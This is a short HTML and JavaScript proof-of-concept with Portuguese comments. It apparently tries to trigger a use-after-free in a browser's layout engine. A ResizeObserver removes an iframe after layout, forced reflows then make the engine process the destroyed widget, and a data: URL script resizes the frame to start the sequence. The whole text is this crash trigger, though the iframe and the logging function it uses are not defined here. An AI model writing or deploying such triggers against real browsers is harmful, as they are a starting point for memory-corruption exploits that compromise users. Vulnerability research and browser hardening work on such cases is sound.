<script>
onload = () => {
    document.documentElement.append(document.createElement('frameset'));
    const i0 = document.getElementById('i0');

    let fired = false;
    const ro = new ResizeObserver((entries) => {
        if (fired) return;
        fired = true;
        log('[+] ResizeObserver fired (post-layout)');

        // Neste ponto: layout acabou, mas cleanup do scope pode estar processando
        i0.remove();

        // Forçar outro layout que vai tentar processar o widget já destruído
        void document.body.offsetWidth;
        void document.documentElement.getBoundingClientRect();
    });

    ro.observe(i0);

    // Trigger: mudar dimensão do iframe ? dispara layout ? ResizeObserver
    location.hash = 'x';
    
    const s = document.createElement('script');
    s.src = `data:text/javascript,` +
        `Promise.resolve().then(() => {` +
            `const i = document.getElementById('i0');` +
            `if(i) { i.style.width = '50px'; }` +  // Muda tamanho ? layout ? observer
        `})`;
    document.head.append(s);
};
</script>
